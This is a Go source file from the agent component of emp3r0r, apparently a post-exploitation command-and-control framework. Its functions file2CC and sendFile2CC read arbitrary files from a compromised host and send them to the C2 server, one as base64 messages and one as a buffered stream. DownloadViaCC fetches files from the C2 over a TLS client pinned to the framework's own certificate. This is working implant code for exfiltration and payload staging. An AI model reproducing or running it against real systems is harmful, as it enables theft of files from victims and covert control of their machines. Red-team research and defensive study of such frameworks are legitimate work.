package agent

import (
	"bufio"
	"crypto/tls"
	"crypto/x509"
	"encoding/base64"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"time"

	"github.com/cavaliercoder/grab"
	"github.com/google/uuid"
	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
	"github.com/jm33-m0/emp3r0r/core/lib/tun"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

// send local file to CC
func file2CC(filepath string, offset int64) (checksum string, err error) {
	// open and read the target file
	f, err := os.Open(filepath)
	if err != nil {
		return
	}
	total := util.FileSize(filepath)
	bytes := make([]byte, total-offset)
	_, err = f.ReadAt(bytes, offset)
	if err != nil {
		return
	}
	checksum = tun.SHA256SumRaw(bytes)

	// base64 encode
	payload := base64.StdEncoding.EncodeToString(bytes)

	fileData := emp3r0r_data.MsgTunData{
		Payload: "FILE" + emp3r0r_data.OpSep + filepath + emp3r0r_data.OpSep + payload,
		Tag:     emp3r0r_data.AgentTag,
	}

	// send
	return checksum, Send2CC(&fileData)
}

// DownloadViaCC download via EmpHTTPClient
// if path is empty, return []data instead
func DownloadViaCC(url, path string) (data []byte, err error) {
	log.Printf("DownloadViaCC is downloading from %s to %s", url, path)
	retData := false
	if path == "" {
		retData = true
		path = fmt.Sprintf("%s/%s", os.TempDir(), uuid.NewString())
	}

	// use EmpHTTPClient
	// start with an empty pool
	rootCAs := x509.NewCertPool()

	// add our cert
	if ok := rootCAs.AppendCertsFromPEM(tun.CACrt); !ok {
		log.Println("No certs appended")
	}

	// Trust the augmented cert pool in our client
	config := &tls.Config{
		InsecureSkipVerify: false,
		RootCAs:            rootCAs,
	}

	// return our http client
	tr := &http.Transport{TLSClientConfig: config}
	client := grab.NewClient()
	client.HTTPClient.Timeout = time.Duration(10) * time.Second
	client.HTTPClient.Transport = tr // use our TLS transport

	req, err := grab.NewRequest(path, url)
	if err != nil {
		err = fmt.Errorf("Create grab request: %v", err)
		return
	}
	resp := client.Do(req)
	if retData {
		data, err = ioutil.ReadFile(path)
		return
	}

	// progress
	t := time.NewTicker(time.Second)
	defer t.Stop()
	for !resp.IsComplete() {
		select {
		case <-resp.Done:
			err = resp.Err()
			if err != nil {
				err = fmt.Errorf("DownloadViaCC finished with error: %v", err)
				log.Print(err)
				return
			}
			log.Printf("DownloadViaCC: saved %s to %s (%d bytes)", url, path, resp.Size)
			return
		case <-t.C:
			log.Printf("%.02f%% complete\n", resp.Progress()*100)
		}
	}

	return
}

// sendFile2CC send file to CC, with buffering
func sendFile2CC(filepath string, offset int64, token string) (checksum string, err error) {
	log.Printf("Sending %s to CC, offset=%d", filepath, offset)
	// open and read the target file
	f, err := os.Open(filepath)
	if err != nil {
		err = fmt.Errorf("sendFile2CC: failed to open %s: %v", filepath, err)
		return
	}
	defer f.Close()

	// seek offset
	_, err = f.Seek(offset, 0)
	if err != nil {
		err = fmt.Errorf("sendFile2CC: failed to seek %d in %s: %v", offset, filepath, err)
		return
	}

	// connect
	url := emp3r0r_data.CCAddress + tun.FTPAPI + "/" + token
	conn, ctx, cancel, err := ConnectCC(url)
	log.Printf("sendFile2CC: connection: %s", url)
	if err != nil {
		err = fmt.Errorf("sendFile2CC: connection failed: %v", err)
		return
	}
	defer cancel()

	// read
	var (
		// send = make(chan []byte, 1024*8)
		buf []byte
	)

	// read file and send data
	log.Printf("Reading from %s", filepath)
	scanner := bufio.NewScanner(f)
	scanner.Split(bufio.ScanBytes)
	for ctx.Err() == nil && scanner.Scan() {
		buf = append(buf, scanner.Bytes()...)
		if len(buf) == 1024*8 {
			_, err = conn.Write(buf)
			if err != nil {
				return
			}
			buf = make([]byte, 0)
			continue
		}
	}
	if len(buf) > 0 && len(buf) < 1024*8 {
		_, err = conn.Write(buf)
		if err != nil {
			return
		}
		log.Printf("Sending remaining %d bytes", len(buf))
	}

	// checksum
	go func() {
		checksum = tun.SHA256SumFile(filepath)
	}()
	log.Printf("Reading %s finished, calculating sha256sum", filepath)
	for checksum == "" {
		time.Sleep(100 * time.Millisecond)
	}

	return
}
